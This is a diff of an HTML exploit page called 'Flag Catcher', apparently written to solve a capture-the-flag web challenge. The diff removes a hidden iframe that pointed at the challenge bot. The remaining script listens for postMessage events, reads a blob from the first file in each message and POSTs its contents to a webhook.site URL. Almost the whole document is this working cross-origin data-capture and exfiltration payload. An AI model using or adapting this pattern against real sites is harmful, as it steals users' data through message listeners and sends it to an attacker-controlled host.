@@ -4,36 +4,33 @@
   <title>Flag Catcher</title>
 </head>
 <body>
-  <h1>Flag Catcher</h1>
+  <h1>Waiting for the flag...</h1>
+
   <script>
-    console.log("[*] In exploit page");
+    console.log("[*] Exploit page loaded. Listening for messages.");
 
-    // Dynamically inject iframe pointing to the challenge page
-    const iframe = document.createElement("iframe");
-    iframe.src = "https://ozoc4d3m-postviewer5.instancer.2025.ctfcompetition.com/bot";
-    iframe.style.display = "none";
-    document.body.appendChild(iframe);
-
-    // Listen for flag postMessage
     window.addEventListener("message", async (event) => {
-      console.log("[*] Got postMessage:", event.data);
+      console.log("[*] Received message:", event.data);
 
       const file = event.data?.files?.[0];
-      if (!file?.blob) return console.warn("No blob received");
+      if (!file?.blob) {
+        console.warn("No blob found in message.");
+        return;
+      }
 
       try {
         const text = await new Blob([file.blob]).text();
-        console.log("[+] Extracted flag text:", text);
+        console.log("[+] Extracted flag:", text);
 
         await fetch("http://webhook.site/3479a7fe-2390-4039-a92c-9ee26bc2c2fb", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ flag: text, filename: file.name })
+          body: JSON.stringify({ flag: text, timestamp: new Date().toISOString() })
         });
 
-        console.log("[+] Flag sent to webhook");
+        console.log("[+] Flag sent to webhook.");
       } catch (e) {
-        console.error("[!] Error parsing blob:", e);
+        console.error("[!] Error reading blob:", e);
       }
     });
   </script>
